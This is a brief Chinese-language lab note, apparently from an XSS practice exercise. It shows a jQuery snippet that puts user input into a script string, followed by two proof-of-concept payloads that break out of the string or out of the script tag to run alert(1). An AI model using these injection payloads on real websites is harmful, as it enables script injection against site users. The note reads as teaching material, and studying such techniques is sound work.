# 1

```

    $ms='2';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }

    }


```

$ms里为我们输入的东西

这里我们尝试闭合标签  //去掉旧的';

```
';alert(1)//
```

# 2

```
'</script><script>alert(1)</script>
```

这个是直接把第一个`<script>`标签给闭合了